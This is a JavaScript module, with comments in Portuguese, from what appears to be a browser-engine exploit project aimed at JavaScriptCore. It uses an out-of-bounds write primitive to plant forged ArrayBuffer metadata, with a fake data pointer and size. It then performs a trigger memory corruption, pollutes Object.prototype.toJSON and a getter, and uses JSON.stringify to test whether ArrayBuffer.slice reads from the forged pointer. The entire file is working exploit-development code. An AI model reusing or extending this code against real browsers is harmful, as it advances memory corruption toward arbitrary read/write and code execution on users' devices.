// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterForSliceTest";
let getter_called_flag = false;
let current_test_results = { success: false, message: "Teste não iniciado.", error: null };

// Metadados sombra que plantamos
const SHADOW_DATA_POINTER = new AdvancedInt64(0x1, 0x0);
const SHADOW_SIZE = new AdvancedInt64(0x1000, 0x0); // 4096 bytes

class CheckpointObjectForSliceTest {
    constructor(id) {
        this.id = `SliceTestCheckpoint-${id}`;
    }
}

export function toJSON_TriggerSliceTestGetter() {
    const FNAME_toJSON = "toJSON_TriggerSliceTestGetter";
    if (this instanceof CheckpointObjectForSliceTest) {
        logS3(`toJSON: 'this' é Checkpoint. Acessando getter '${GETTER_CHECKPOINT_PROPERTY_NAME}'...`, "info", FNAME_toJSON);
        try {
            // eslint-disable-next-line no-unused-vars
            const val = this[GETTER_CHECKPOINT_PROPERTY_NAME]; // Aciona o getter
        } catch (e) {
            logS3(`toJSON: Erro ao acessar getter: ${e.message}`, "error", FNAME_toJSON);
        }
    }
    return this.id;
}

// A função exportada mantém o nome para compatibilidade
export async function executeRetypeOOB_AB_Test() {
    const FNAME_TEST = "executeSliceTestInGetter";
    logS3(`--- Iniciando Teste .slice() no Getter após Escrita OOB ---`, "test", FNAME_TEST);

    getter_called_flag = false;
    current_test_results = { success: false, message: "Teste não executado ou getter não chamado.", error: null };

    if (!JSC_OFFSETS.ArrayBufferContents || !JSC_OFFSETS.ArrayBuffer?.KnownStructureIDs?.ArrayBuffer_STRUCTURE_ID) {
        logS3("Offsets críticos não definidos. Abortando.", "critical", FNAME_TEST);
        current_test_results.message = "Offsets críticos não definidos.";
        return;
    }

    let toJSONPollutionApplied = false;
    let getterPollutionApplied = false;
    let originalToJSONProtoDesc = null;
    let originalGetterDesc = null;
    const ppKey_val = 'toJSON';

    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real || !oob_dataview_real) {
            current_test_results = { success: false, message: "Falha ao inicializar OOB.", error: "OOB env not set" };
            logS3(current_test_results.message, "critical", FNAME_TEST);
            return;
        }
        logS3(`Ambiente OOB inicializado. oob_ab_len: ${oob_array_buffer_real.byteLength}`, "info", FNAME_TEST);

        // 1. Plantar "Metadados Sombra" (ArrayBufferContents falsos)
        const shadow_contents_offset_in_oob_data = 0x0;
        oob_write_absolute(shadow_contents_offset_in_oob_data + JSC_OFFSETS.ArrayBufferContents.SIZE_IN_BYTES_OFFSET_FROM_CONTENTS_START, SHADOW_SIZE, 8);
        oob_write_absolute(shadow_contents_offset_in_oob_data + JSC_OFFSETS.ArrayBufferContents.DATA_POINTER_OFFSET_FROM_CONTENTS_START, SHADOW_DATA_POINTER, 8);
        logS3(`Metadados sombra plantados: ptr=${SHADOW_DATA_POINTER.toString(true)}, size=${SHADOW_SIZE.toString(true)}`, "info", FNAME_TEST);

        // 2. Realizar a escrita OOB "gatilho" (usando o valor que sabemos que funciona)
        const corruption_trigger_offset_abs = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
        const corruption_value = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF); // Valor conhecido por acionar o getter
        oob_write_absolute(corruption_trigger_offset_abs, corruption_value, 8);
        logS3(`Escrita OOB gatilho em ${toHex(corruption_trigger_offset_abs)} do oob_data completada.`, "info", FNAME_TEST);

        // 3. Configurar o getter e poluir
        const checkpoint_obj = new CheckpointObjectForSliceTest(1);
        originalGetterDesc = Object.getOwnPropertyDescriptor(CheckpointObjectForSliceTest.prototype, GETTER_CHECKPOINT_PROPERTY_NAME);

        Object.defineProperty(CheckpointObjectForSliceTest.prototype, GETTER_CHECKPOINT_PROPERTY_NAME, {
            get: function() { // Getter SÍNCRONO
                getter_called_flag = true;
                const FNAME_GETTER = "SliceTest_Getter";
                logS3(`Getter "${GETTER_CHECKPOINT_PROPERTY_NAME}" FOI CHAMADO! Testando oob_array_buffer_real.slice(0, 8)...`, "vuln", FNAME_GETTER);
                current_test_results = { success: false, message: "Getter chamado, teste .slice() em andamento.", error: null };

                try {
                    if (!oob_array_buffer_real) {
                        current_test_results.message = "oob_array_buffer_real era null no getter.";
                        logS3("DENTRO DO GETTER: oob_array_buffer_real é null!", "critical", FNAME_GETTER);
                        return 0xDEADDEAD;
                    }

                    logS3(`DENTRO DO GETTER: Tentando oob_array_buffer_real.slice(0, 8). byteLength original reportado: ${oob_array_buffer_real.byteLength}`, "info", FNAME_GETTER);
                    
                    // A tentativa crítica: chamar .slice()
                    // Se oob_array_buffer_real foi re-tipado para usar os metadados sombra (data_ptr=0x1, size=0x1000),
                    // slice(0,8) tentaria ler 8 bytes a partir do endereço 0x1.
                    let new_sliced_ab = oob_array_buffer_real.slice(0, 8);

                    // Se chegarmos aqui, o slice NÃO causou um erro visível ao JS.
                    logS3(`DENTRO DO GETTER: oob_array_buffer_real.slice(0, 8) BEM-SUCEDIDO INESPERADAMENTE. new_sliced_ab.byteLength: ${new_sliced_ab.byteLength}`, "error", FNAME_GETTER);
                    // Verificar o conteúdo para ver de onde ele realmente leu
                    if (new_sliced_ab.byteLength === 8) {
                        const dv_slice = new DataView(new_sliced_ab);
                        logS3(`DENTRO DO GETTER: Conteúdo do slice (primeiros 4 bytes): ${toHex(dv_slice.getUint32(0,true))}`, "info", FNAME_GETTER);
                    }
                    current_test_results.message = `slice(0,8) NÃO causou erro. new_sliced_ab.byteLength: ${new_sliced_ab.byteLength}.`;

                } catch (e) {
                    logS3(`DENTRO DO GETTER: ERRO durante oob_array_buffer_real.slice(): ${e.message}`, "error", FNAME_GETTER);
                    // Verificar se o erro é o esperado (RangeError, erro de acesso à memória)
                    if (String(e.message).toLowerCase().includes("rangeerror") || 
                        String(e.message).toLowerCase().includes("memory access out of bounds") ||
                        String(e.message).toLowerCase().includes("segmentation fault") ||
                        String(e.message).toLowerCase().includes("bus error") ||
                        String(e.message).toLowerCase().includes("bad access")) {
                        logS3(`DENTRO DO GETTER: SUCESSO ESPECULATIVO! O erro '${e.message}' é CONSISTENTE com slice() tentando ler de ${SHADOW_DATA_POINTER.toString(true)}!`, "vuln", FNAME_GETTER);
                        current_test_results = { success: true, message: `.slice() causou CRASH CONTROLADO esperado ('${e.message}') ao tentar ler de ${SHADOW_DATA_POINTER.toString(true)}.`, error: String(e) };
                    } else {
                        current_test_results = { success: false, message: `Erro inesperado com .slice(): ${e.message}`, error: String(e) };
                    }
                }
                return 0xBADF00D;
            },
            configurable: true
        });
        getterPollutionApplied = true;

        originalToJSONProtoDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
        Object.defineProperty(Object.prototype, ppKey_val, {value: toJSON_TriggerSliceTestGetter, writable: true, enumerable: false, configurable: true});
        toJSONPollutionApplied = true;
        logS3(`Poluições aplicadas.`, "info", FNAME_TEST);

        logS3(`Chamando JSON.stringify(checkpoint_obj)...`, "info", FNAME_TEST);
        try {
            JSON.stringify(checkpoint_obj);
        } catch (e) {
            logS3(`Erro JSON.stringify: ${e.message}`, "error", FNAME_TEST);
        }

    } catch (mainError) {
        logS3(`Erro principal: ${mainError.message}`, "critical", FNAME_TEST);
        console.error(mainError);
        current_test_results = { success: false, message: `Erro crítico: ${mainError.message}`, error: String(mainError) };
    } finally {
        // Restauração
        if (toJSONPollutionApplied && Object.prototype.hasOwnProperty(ppKey_val)) { delete Object.prototype[ppKey_val]; if(originalToJSONProtoDesc) Object.defineProperty(Object.prototype, ppKey_val, originalToJSONProtoDesc); }
        if (getterPollutionApplied && CheckpointObjectForSliceTest.prototype.hasOwnProperty(GETTER_CHECKPOINT_PROPERTY_NAME)) { delete CheckpointObjectForSliceTest.prototype[GETTER_CHECKPOINT_PROPERTY_NAME]; if(originalGetterDesc) Object.defineProperty(CheckpointObjectForSliceTest.prototype, GETTER_CHECKPOINT_PROPERTY_NAME, originalGetterDesc); }
        logS3("Limpeza finalizada.", "info", "CleanupFinal");
    }

    if (getter_called_flag) {
        if (current_test_results.success) {
            logS3(`RESULTADO TESTE SLICE: ${current_test_results.message}`, "vuln", FNAME_TEST);
        } else {
            logS3(`RESULTADO TESTE SLICE: Getter chamado, mas sem sucesso. ${current_test_results.message}`, "warn", FNAME_TEST);
        }
    } else {
        logS3("RESULTADO TESTE SLICE: Getter NÃO foi chamado.", "error", FNAME_TEST);
    }
    logS3(`  Detalhes finais: ${JSON.stringify(current_test_results)}`, "info", FNAME_TEST);

    clearOOBEnvironment();
    logS3(`--- Teste .slice() no Getter Concluído ---`, "test", FNAME_TEST);
}
